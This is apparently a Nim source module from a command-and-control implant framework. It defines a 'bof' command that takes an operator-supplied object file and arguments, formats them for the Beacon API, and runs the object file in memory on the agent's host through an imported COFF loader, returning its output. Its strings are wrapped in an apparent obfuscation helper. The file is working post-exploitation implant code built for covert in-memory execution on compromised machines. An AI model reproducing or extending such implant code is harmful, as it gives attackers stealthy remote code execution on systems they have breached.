import ../common/[types, utils]

# Define function prototype
proc executeBof(ctx: AgentCtx, task: Task): TaskResult 

# Command definition (as seq[Command])
let commands*: seq[Command] =  @[
    Command(
        name: protect("bof"),
        commandType: CMD_BOF,
        description: protect("Execute an object file in memory and retrieve the output."),
        example: protect("bof /path/to/dir.x64.o C:\\Users"),
        arguments: @[
            Argument(name: protect("path"), description: protect("Path to the object file to execute."), argumentType: BINARY, isRequired: true),
            Argument(name: protect("arguments"), description: protect("Arguments to be passed to the object file. Arguments are handled as STRING, unless specified with a prefix ([i]:INT, [w]:WSTRING, [s]:SHORT; the colon separates prefix and value)"), argumentType: STRING, isRequired: false)
        ],
        execute: executeBof
    )
]

# Implement execution functions
when defined(server):
    proc executeBof(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent):

    import osproc, strutils, strformat
    import ../agent/core/coff
    import ../agent/protocol/result
    import ../common/[utils, serialize]
    
    proc executeBof(ctx: AgentCtx, task: Task): TaskResult = 
        try: 
            var 
                objectFile: seq[byte] 
                arguments: seq[byte]

            # Parse arguments 
            case int(task.argCount): 
            of 1: # Only the object file has been passed as an argument
                objectFile = task.args[0].data
                arguments = @[]
            else: # Parameters were passed to the BOF execution
                objectFile = task.args[0].data

                # Combine the passed arguments into a format that is understood by the Beacon API
                arguments = generateCoffArguments(task.args[1..^1])
            
            # Unpacking object file, since it contains the file name too.
            var unpacker = Unpacker.init(Bytes.toString(objectFile))
            let 
                fileName = unpacker.getDataWithLengthPrefix()
                objectFileContents = unpacker.getDataWithLengthPrefix()

            echo fmt"   [>] Executing object file {fileName}."
            let output = inlineExecuteGetOutput(string.toBytes(objectFileContents), arguments)

            if output != "":
                return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
            else: 
                return createTaskResult(task, STATUS_FAILED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
